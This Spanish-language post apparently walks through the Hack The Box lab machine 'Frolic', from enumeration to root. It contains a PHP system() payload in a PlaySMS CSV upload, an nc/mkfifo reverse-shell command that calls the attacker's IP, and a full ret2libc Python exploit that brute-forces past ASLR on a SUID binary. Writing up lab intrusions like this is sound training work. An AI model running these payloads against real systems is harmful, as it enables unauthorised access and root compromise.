---
layout: post
title: HTB_Frolic
date: 2023/07/10
slug: HTB_Frolic
heroImage: /assets/machines.jpg
---

# Frolic {-}

## Introduccion {-}

La maquina del dia se llama Frolic.

El replay del live se puede ver aqui

[![S4vitaar Frolic maquina](https://img.youtube.com/vi/wJRb8PtpKD0/0.jpg)](https://www.youtube.com/watch?v=wJRb8PtpKD0)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.z
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.111
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.111 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,139,445,1880,9999 10.10.10.111 -oN targeted
```


| Puerto | Servicio     | Que se nos occure?          | Que falta? |
| ------ | ------------ | --------------------------- | ---------- |
| 22     | ssh          | Coneccion directa           |            |
| 139    | NetBios      |                             |            |
| 445    | Samba        | Conneccion con Null session |            |
| 1880   | http Node.js | Fuzzing                     |            |
| 9999   | http nginx   |                             |            |


### Analyzando el Samba {-}

```bash
smbclient -L 10.10.10.111 -N
smbmap -H 10.10.10.111 
```

Vemos un recurso 
```bash
 Printer Driver 
```
 y 
```bash
 IPC 
```
 pero no tenemos accesso.

### Analyzando la web {-}

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.111:1880 
```
. Vemos un panel de inicio de session **Node-Red**. Intentamos login por defectos como 
```bash
 admin:admin 
```
 pero no va.
Miramos por internet si existen credenciales por defecto con **Node-Red** pero por el momento no encontramos nada.

Checkeamos la url 
```bash
 http://10.10.10.111:9999 
```
 y vemos la pagina por defecto de **Nginx**. En esta pagina vemos una url 
```bash
 http://forlic.htb:1880 
```
. Nos parece turbio porque
la url es **forlic** y no **frolic**, pero ya nos hace pensar que se puede aplicar virtual hosting. Lo añadimos al 
```bash
 /etc/hosts 
```
 y probamos pero no vemos ninguna diferencia.

#### Aplicando Fuzzing {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/FUZZ
```

Aqui encontramos routas como

- admin
- test
- dev
- backup

Si vamos a la url 
```bash
 http://10.10.10.111:9999/admin 
```
 vemos un panel de inicio de session que nos dice *c'mon i m hackable*.

Intentamos nuevamente 
```bash
 admin:admin 
```
 y nos sale un mensaje **you have 2 more left attempts**, controlamos si esto es general o solo para el usuario admin 
```bash
 test:test 
```

y vemos que es general. 










## Vulnerability Assessment {-}

### Credenciales en ficheros javascript y lenguaje esoterico {-}

En este caso no tocamos mas porque no queremos ser bloqueados. Si miramos el codigo fuente vemos que hay un fichero 
```bash
 login.js 
```
 que contiene las
credenciales.

Entramos las credenciales en la web 
```bash
 admin:superduperlooperpassword_lol 
```
 y conseguimos connectarnos y entramos en una pagina que contiene caracteres raros. Esto en concreto
se llama **Lenguaje esoterico**. Pero primero tenemos que buscar que lenguaje esoterico es en concreto.

Si buscamos en la web por 
```bash
 esoteric languages 
```
 encontramos una lista de 10 lenguajes esotericos en [esolangs](https://esolangs.org/wiki/Esoteric_programming_language). Uno de ellos nos 
llama la atencion porque es bastante parecido. Este seria el [Ook!](https://esolangs.org/wiki/Ook!). La diferencia es que cada **.** **?** **!** contiene un **Ook** delante.

Copiamos los caracteres en un fichero 
```bash
 data 
```
 y lo tratamos para que se paresca al 
```bash
 Ook! 
```


```bash
cat data | sed 's/\./Ook\./g' | sed 's/\?/Ook\?/g' | sed 's/\!/Ook\!/g' | xclip -sel clip
```

Copiamos el mensaje en la web [dcode.fr](https://dcode.fr). Buscamos el code 
```bash
 Ook! 
```
 y colamos el mensaje y decodificando nos da el mensaje **Nothing here check
**/asdiSIAJJ0QWE9JAS** que parece ser una routa.

Si vamos a la url 
```bash
 http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS 
```
 vemos una nueva pagina con un nuevo mensaje que parece se **base64**.

```bash
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" 
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' '
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64 > data

file data
mv data data.zip
```

Aqui vemos que es un comprimido 
```bash
 .zip 
```
 y si le damos a 
```bash
 unzip data.zip 
```
 vemos que esta protegida por contraseña.


### Crackeando con fcrackzip {-}

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data.zip
```

Aqui vemos que la contraseña es 
```bash
 password 
```
.

Volmemos a descomprimir el fichero poniendole la contraseña y vemos un fichero 
```bash
 index.php 
```


```bash
cat index.php
```

vemos que nuevamente esta encryptada con caracteres del 
```bash
 a-f 
```
 y del 
```bash
 0-9 
```
 que seria Hexadecimal.

```bash
cat index.php | xxd -ps -r
```

y aqui parece ser nuevamente un base64.

```bash
cat index.php | xxd -ps -r > data
cat data | xargs
cat data | xargs | tr -d ' '
cat data | xargs | tr -d ' ' | base64 -d > data
cat data
```

Estamos nuevame frente a un lenguaje esoterico que parece se un **brainfuck**. Lo copiamos en la clipboard y lo decodificamos nuevamente en la web. En este
caso tiraremos de la web [tutorialspoint](https://www.tutorialspoint.com/execute_brainfk_online.php).

Pegamos el codigo y le damos a **Execute** y vemos el mensaje 
```bash
 idkwhatispass 
```
 que nos hace pensar en una contraseña. Intentamos ver si es la contraseña del usuario
admin del panel de authenticacion 
```bash
 Node-Red 
```
 pero no funcciona.

### Continuando analyzando las routas {-}

Si vamos a la url 
```bash
 http://10.10.10.111:9999/test 
```
 vemos un **php_info**. Lo primero aqui es siempre mirar las **disabled_functions**. No parece ser desabilitadas las
funcciones 
```bash
 exec() 
```
, 
```bash
 shell_exec() 
```
 o 
```bash
 system() 
```
.

Vamos a la url 
```bash
 http://10.10.10.111:9999/dev 
```
 y vemos un **403 Forbidden**. Como esta Forbidden intentamos ver si a routas validas bajo la routa 
```bash
 /dev 
```
 con **WFUZZ**.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/dev/FUZZ
```

y encontramos otras routas 
- test
- backup

 Si vamos a la url 
```bash
 http://10.10.10.111:9999/dev/test 
```
 nos descarga un fichero. y a la routa 
```bash
 http://10.10.10.111:9999/dev/backup 
```
 hay una nueva routa 
```bash
 /playsms 
```
.

Miramos lo que hay en la url 
```bash
 http://10.10.10.111.9999/playsms 
```
 y vemos un panel de inicio de session **playsms**. Miramos si hay vulnerabilidades asociadas con searchsploit.

```bash
searchsploit playsms
```

Y vemos que hay exploits con Template Injection y Remote code execution.

Intentamos loggearnos con 
```bash
 admin:admin 
```
, no va y intentamos el password que hemos encontrado antes. 
```bash
 admin:idkwhatispass 
```
 y en este caso funcciona.

### Explotando PlaySMS {-}

Buscamos un exploit que nos permite hacer RCE.

```bash
searchsploit playsms | grep -v -i metasploit | grep -i "remote code execution"
searchsploit -x 42044
```

Aqui el exploit nos dice que una vez loggeado con cualquier usuario, tenemos que ir a la url 
```bash
 http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list 
```
,
y uploadear un fichero malicioso backdoor.csv

```csv
Name,Mobile,Email,Groupe code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,,
```

Aqui podemos ver que el exploit usa una cabezera para transmitir el comando que queremos ejecutar con la fuccion php 
```bash
 system() 
```
. Esto quiere decir que tenemos que uzar
burpsuite para cambiar el user agent durante el upload.

Lanzamos Burpsuite y interceptamos el envio del fichero backdoor.csv. Cambiamos el User-Agent con 
```bash
 whoami 
```
, Forwardeamos la peticion y en la web podemos ver

```bash
 www-data 
```
 en la columna Name.

## Vuln exploit & Gaining Access {-}

### Ganando acceso con PlaySMS {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos nuevamente el csv a la web y interceptamos la peticion con burpsuite
1. Cambiamos el User-agent 

    ```bash
    User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag

```bash
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt 2>/dev/null | xargs cat
```

Ya podemos ver la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/ayush
ls -la
```

Aqui vemos un directorio turbio donde nosotros como el usuario **www-data** tenemos derechos

```bash
cd ./binary
ls -la
```

Aqui vemos un fichero 
```bash
 rop 
```
 que tiene derechos suid como el usuario root. y como se llama rop pensamos directamente a un BufferOverflow

```bash
./rop

[*] Usage: program <message>


./rop EEEEEE

[*] Message sent: EEEEEE
```

Aqui vamos a usar python y ver si hay un BOF

```bash
./rop $(python -c 'print "A"*500)
Segmentation fault (core dumped)
```

Como vemos que hay un BOF nos enviamos el binario a nuestra maquina de atacante y tratamos el BOF. Nos lo enviamos con un http.server de python

1. en la maquina victima

    ```bash
    python3 -m http.server 8080
    ```

1. en nuestra maquina de atacante

    ```bash
    wget http://10.10.10.111:8080/rop
    chmod -x rop
    ```

#### Tratando el BOF {-}

1. Lanzamos el binario con gdb-gef

    ```bash
    gdb ./rop

    gef> r
    gef> r EEEE
    [*] Message sent: EEEEEE

    disass main
    ```

    Aqui vemos cosas como el SUID y la llamada a la funccion **put**

1. Miramos la seguridad del binario

    ```bash
    checksec
    ```

    Aqui vemos quel NX esta abilitado. Esto quiere decir quel DEP (Data Execution Prevention) esta habilitado, lo que significa que no podemos redirigir
    el flujo del programa a la pila para ejecutar comandos a nivel de systema.

1. Lanzamos 500 A

    ```bash
    gef> r $(python -c 'print "A"*500')
    ```

    Aqui vemos que hemos sobrepassado el $eip que ahora apunta a 0x41414141 que son 4 "A"

1. Buscamos el offset necessario antes de sobrescribir el $eip

    ```bash
    gef> pattern create 100
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    
    gef> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

    gef> pattern offset $eip
    [+] Found at offset 52 (little-endian search) likely
    ```

    Aqui vemos que el offset es de 52 caracteres.

1. Comprobamos poniendole 52 A y 4 B

    ```bash
    gef> r $(pyhton -c 'print "A"*52 + "B"*4')
    ```

    Y vemos que el $eip vale ahora 0x42424242 que son 4 "B"

Como aqui sabemos que no podemos ejecutar comandos desde la pila porque el NX esta habilitado, la primera cosa que nos pasa por la cabeza seria
usar la technica 
```bash
 Ret2Libc 
```
. Lo que tenemos que ver para efectuar esta tecnica seria ver si hay que burlar el ASLR en caso de que haya aleatorisacion 
en las direcciones de la memoria.

Esto se controla desde la maquina victima.

1. miramos si la architectura de la maquina es 32 o 64 bits

    ```bash
    uname -a
    ```

    vemos que estamos en una maquina con architectura 32 bits

1. miramos si el ASLR esta habilitado

    ```bash
    cat /proc/sys/kernel/randomize_va_space

    #Output
    2
    ```

    Esta habilitado y lo podemos comprobar dandole multiples vecez al comando 
```bash
 ldd rop 
```
 y vemos que la libreria libc.so.6 cambia
    de direccion cada vez.

Ahora que tenemos esto en cuenta miramos como atacamos el BOF con un 
```bash
 Ret2Libc 
```
. La tecnica aqui seria que una vez tomado el control del $eip
redirigir el programa a la direccion del 

1. system_addr
1. exit_addr
1. bin_sh_addr

ret2libc -> system_addr + exit_addr + bin_sh_addr.

Solo falta conocer las direcciones de estas funcciones. Como la maquina es de architectura 32 bits, podemos intentar colision con las direcciones.
De que se trata exactamente; En condiciones normales (donde el ASLR no esta activado), sumariamos los diferentes ofsets de las funcciones 
```bash
 system 
```
, 

```bash
 exit 
```
 y 
```bash
 /bin/sh 
```
 a la direccion de la libreria 
```bash
 libc 
```
. Estas direcciones se encuentran de la manera siguiente.

1. la direccion de libreria libc

    ```bash
    ldd rop
    ldd rop | grep libc
    ldd rop | grep libc | awk 'NF{print $NF}'
    ldd rop | grep libc | awk 'NF{print $NF}' | tr -d '()'

    #Output
    0xb771f000
    ```

1. los offsets del system_addr y del exit

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@ | exit@@"
    
    #Output
     141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
    1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
    ```

    Aqui el *0003ada0* y el *0002e9d0* son los offset que tendriamos que sumar a la direccion de la libreria libc

1. el offset de la cadena 
```bash
 /bin/sh 
```


    ```bash
    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
    
    #Output
    15ba0b /bin/sh
    ```

En este caso las direcciones serian 
- system = 0xb771f000 + 0003ada0
- exit = 0xb771f000 + 0002e9d0
- /bin/sh = 0xb771f000 + 15ba0b

Pero como la direccion cambia la tenemos que calcular o conocer antes. La suerte aqui es que como estamos en 32b, las
direcciones no cambian demasiado y esto se puede comprobar con bucles.

1. Verificamos con un bucle de 10 turnos las direcciones cambiantes

    ```bash
    for i in $(seq 1 10); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done
    ```

1. Copiamos una de ellas (0xb7568000) y miramos si aparece multiples veces en un bucle de 1000 turnos

    ```bash
    for i in $(seq 1 1000); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done | grep "0xb7568000"
    ```

Constatamos que aparece multiples vecez. Esto quiere decir que podriamos lanzar el binario o mejor dicho el exploit multiples vecez hasta que 
esta direccion salga.


#### Creando el exploit en python {-}

```bash
cd /tmp
mkdir privesc
cd $!
touch exploit.py
vi exploit.py
```

El exploit seria:

```python
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

offset = 52
junk = "A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc = 0xb7568000

#141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
#1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
#15ba0b /bin/sh

system_addr_offset = 0x0003ada0
exit_addr_offset = 0x0002e9d0
bin_sh_addr_offset = 0x0015ba0b

system_addr = pack("<I", base_libc + system_addr_offset)
exit_addr = pack("<I", base_libc + exit_addr_offset)
bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

# Lanzamos el bucle infinito hasta que la direccion sea la buena
while True:
    #lanzamos el subprocess y almazenamos el codigo de estado en una variable ret
    ret = call(["/home/ayush/.binary/rop", payload])
    # Si el codigo de estado es exitoso salimos del programa
    if ret == 0:
        print("\n[+] Saliendo del programa...\n")
        sys.exit(0)
```

lanzamos el script con 
```bash
 python exploit.py 
```
 y esperamos de salir del bucle infinito para ganar la shell como root y leer la flag.
